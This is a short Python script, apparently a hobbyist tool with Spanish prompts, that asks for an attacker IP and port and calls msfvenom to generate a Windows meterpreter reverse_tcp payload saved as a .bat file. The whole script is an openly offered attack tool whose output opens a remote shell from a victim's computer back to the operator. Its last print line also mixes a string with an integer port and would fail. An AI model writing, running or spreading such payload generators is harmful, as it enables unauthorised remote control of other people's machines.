# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
from colorama import init, Fore, Style
init(autoreset=True)

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(10)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)
#-----------------------------------------------------------------------------
clear()
print(Fore.BLUE + "[!] A Continuacion, Se Completara La Creacion Del Archivo BAT (reverb shell atraves tcp)\n")

direccionIP = input(f"{Fore.RED}[Create BAT]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese Su Direccion IP: ")
opc = input(f"{Fore.RED}[Create BAT] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")
while (opc == "n"):
    direccionIP = input(f"{Fore.RED}[Create BAT] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}Ingrese Nuevamente Su Direccion IP: ")
    opc = input(f"{Fore.RED}[Create BAT] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")

print(Fore.GREEN + f"[!] Se Ha Establecido Tu Direccion IP ({direccionIP}), ¡Correctamente!")
reverse(seg=1.5)

clear()
port = int(input(f"{Fore.RED}[Create BAT]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Proporcione un Puerto de Escucha: "))
print(Fore.GREEN + f"[!] El Puerto de Escucha ({str(port)}) Se ha Establecido Correctamente..\n")
reverse(seg=1.5)

clear()
print(f"{Fore.RED}[Create BAT]{Fore.RESET}- {Fore.GREEN}[!] Creando Archivos de Inyeccion Del .bat")
reverse(seg=1)
print(f"{Fore.RED}[Create BAT]{Fore.RESET}- {Fore.GREEN}[!] Creando Logica Meterpreter...")
reverse(seg=1)
Barra(desc="Redireccionando Archivos A Flujo de Inyeccion...")
clear()

try:
    comando = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={direccionIP} LPORT={port} -f bat -o payloadInyecction.bat"
    resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
    print("\n ---------- Se Ha Creado El Archivo .BAT Correctamente ---------- \n")
    print("***______ Informacion Y Detalles ______***")
    print(f"{Fore.CYAN}IP: {Fore.RESET + direccionIP}")
    print(f"{Fore.CYAN}IP: {Fore.RESET + port}")
    
except subprocess.CalledProcessError as e:
    print(f"Error al Crear El Archivo :( {e}")
    input("\nPresione Enter Para Finalizar... ")

